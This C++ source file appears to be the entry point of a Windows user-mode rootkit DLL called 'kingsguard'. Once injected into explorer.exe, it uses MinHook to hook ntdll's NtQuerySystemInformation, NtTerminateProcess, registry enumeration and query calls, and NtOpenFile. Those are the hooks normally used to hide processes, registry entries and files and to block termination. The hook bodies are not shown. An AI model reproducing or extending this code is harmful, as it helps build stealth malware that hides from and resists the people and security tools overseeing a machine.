#include "kingsguard.h"

bool InstallHook()
{
    OutputDebugStringA("installing hooks");
    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID*>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID*>(&OriginalNtTerminateProcess)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID*>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID*>(&OriginalNtEnumerateValueKey)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID*>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID*>(&OriginalNtQueryValueKey)) != MH_OK) { return false; }
    if (MH_CreateHookApi(L"ntdll", "NtOpenFile", reinterpret_cast<LPVOID*>(&HookedNtOpenFile), reinterpret_cast<LPVOID*>(&OriginalNtOpenFile)) != MH_OK) { return false; }

    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return false; }

    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!IsExplorerProcess() || !InstallHook())
            return FALSE;
        OutputDebugStringA("hooks installed.");
        OutputDebugStringA(std::to_string(GetCurrentProcessId()).c_str());
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        MH_DisableHook(MH_ALL_HOOKS);
        break;
    }
    return TRUE;
}
